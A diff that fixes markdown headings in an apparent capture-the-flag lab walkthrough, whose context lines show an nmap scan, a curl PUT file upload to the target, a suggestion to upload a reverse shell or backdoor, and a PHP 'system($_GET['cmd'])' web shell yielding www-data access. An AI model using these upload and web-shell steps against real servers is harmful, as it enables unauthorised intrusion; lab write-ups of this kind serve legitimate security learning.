@@ -17,8 +17,8 @@ Nmap done: 254 IP addresses (5 hosts up) scanned in 2.35 seconds
 192.168.114.131 is my KALI machine
 192.168.114.132 is target machine
 
-#Enumeration
-###Port Enumeration
+# Enumeration
+### Port Enumeration
 ```
 nmap -sV 192.168.114.132
 ```
@@ -87,7 +87,7 @@ curl -T 'test.txt' 'http://192.168.114.132/test/test.txt' --http1.0
 Successfully Uploaded a file. 
 
 
-### Exploit
+# Exploit
 Now we have full reigns on upload , you can upload a reverse php shell, backdoor etc. In this case we'll upload a basic php system call.
 ```
 echo 'system($_GET['cmd']);' | base64      // Not neccessary to encode it to base64
@@ -110,7 +110,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-#Privilege Escalation
+# Privilege Escalation
 
 
 
